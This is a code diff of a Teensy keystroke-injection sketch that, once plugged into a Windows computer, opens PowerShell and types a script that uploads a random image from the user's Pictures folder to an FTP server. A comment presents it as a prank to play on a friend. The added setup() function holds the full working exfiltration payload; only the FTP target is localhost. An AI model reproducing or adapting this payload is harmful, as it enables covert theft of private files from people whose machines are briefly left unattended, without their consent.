@@ -8,30 +8,6 @@
 #include <Arduino.h>
 #include "../lib/PlaywithTeensy.h"
 
-/* this JOKE is a pic stoler , it choses a rondom picture from the default pictures folder 
-in windows OS "Pictures/" and it send it to an ftp depot, you can just play with your friend
-and tel him that for example 'you're a magician (science is magic because magic is science)
-and you will have his photo in your phone in just 60 seconds whithout touch his keyboard */
-void setup() {
-    // put your setup code here, to run once:
-    //Init LED for blinking
-    pinMode(LED_BUILTIN, OUTPUT);
-    //turn led on to show that the teensy is working
-    digitalWrite(LED_BUILTIN, HIGH);
-    //excuting 
-    writeline("");
-    //turn led of when teensy finish his "mission"
-    digitalWrite(LED_BUILTIN, LOW);
-}
-
-void loop() {
-   delay(1000);
-}
-void ExecutePowershellCMD(String cmd){
-    openPowerShell();
-    writeline(cmd);
-}
-
 void writeline(String cmd){
     delay(100);
     Keyboard.print(cmd);  
@@ -70,4 +46,33 @@ void openPowerShell(){
     Keyboard.set_key1(0);
     Keyboard.send_now();
     delay(100);
+}
+
+void ExecutePowershellCMD(String cmd){
+    openPowerShell();
+    writeline(cmd);
+}
+
+
+/* this JOKE is a pic stoler , it choses a rondom picture from the default pictures folder 
+in windows OS "Pictures/" and it send it to an ftp depot, you can just play with your friend
+and tel him that for example 'you're a magician (science is magic because magic is science)
+and you will have his photo in your phone in just 60 seconds whithout touch his keyboard */
+void setup() {
+    // put your setup code here, to run once:
+    //Init LED for blinking
+    pinMode(LED_BUILTIN, OUTPUT);
+    
+    //turn led on to show that the teensy is working
+    digitalWrite(LED_BUILTIN, HIGH);
+    
+    //excuting 
+    ExecutePowershellCMD("cd .\Pictures\ \n$ftp = [System.Net.FtpWebRequest]::Create(\"ftp://localhost/joke.png\") \n$ftp = [System.Net.FtpWebRequest]$ftp \n$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile \n$ftp.Credentials = new-object System.Net.NetworkCredential(\"anonymous\",\"anonymous@localhost\") \n$ftp.UseBinary = $true \n$ftp.UsePassive = $true \n$filename = Get-ChildItem -name | Select-Object -index $(Random $((Get-ChildItem).Count)) \n$content = [System.IO.File]::ReadAllBytes($filename) \n$ftp.ContentLength = $content.Length \n$rs = $ftp.GetRequestStream() \n$rs.Write($content, 0, $content.Length) \n$rs.Close() \n$rs.Dispose() \n");
+    
+    //turn led of when teensy finish his "mission"
+    digitalWrite(LED_BUILTIN, LOW);
+}
+
+void loop() {
+   delay(1000);
 }
